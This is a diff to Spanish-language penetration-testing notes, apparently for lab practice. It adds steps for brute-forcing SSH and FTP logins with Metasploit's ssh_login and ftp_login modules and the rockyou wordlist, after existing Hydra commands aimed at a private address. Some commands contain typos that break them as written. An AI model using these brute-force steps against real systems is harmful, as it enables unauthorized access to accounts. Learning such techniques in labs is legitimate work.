@@ -76,3 +76,40 @@ hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p alexis ssh://192.168.
 hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p alexis ftp://192.168.0.27
 
 ```
+
+
+# Fuerza bruta con Metasploit
+con Metasploit tamiben se puede hacer  fuerza bruta igual que con Hydra
+Indicar que esto es más lento que Hydra
+
+```sh title:"metaesploit para fuerza bruta pfr ssh"
+msf6 > serch ssh_login
+msf6 > use 0
+msf6 auxiliary(scanner/ssh/ssh_login) > show options
+msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME juan
+msf6 auxiliary(scanner/ssh/ssh_login) > show options
+msf6 auxiliary(scanner/ssh/ssh_login) > set PASS?FILE /user/share/wordlists/rockyou.txt
+msf6 auxiliary(scanner/ssh/ssh_login) > set RHOST {IP maquina victima}
+msf6 auxiliary(scanner/ssh/ssh_login) > show options
+msf6 auxiliary(scanner/ssh/ssh_login) > set VERBOSE false
+
+msf6 auxiliary(scanner/ssh/ssh_login) > run
+```
+
+
+
+Tambien lo podemos hacer con el protocolo FTP
+
+```sh title:"metaesploit para fuerza bruta por ftp"
+msf6 > serch ftp_login
+msf6 > use 0
+msf6 auxiliary(scanner/ftp/ftp_login) > show options
+msf6 auxiliary(scanner/ftp/ftp_login) > set USERNAME juan
+msf6 auxiliary(scanner/ftp/ftp_login) > show options
+msf6 auxiliary(scanner/ftp/ftp_login) > set PASS?FILE /user/share/wordlists/rockyou.txt
+msf6 auxiliary(scanner/ftp/ftp_login) > set RHOST {IP maquina victima}
+msf6 auxiliary(scanner/ftp/ftp_login) > show options
+msf6 auxiliary(scanner/ftp/ftp_login) > set VERBOSE false
+
+msf6 auxiliary(scanner/ftp/ftp_login) > run
+```
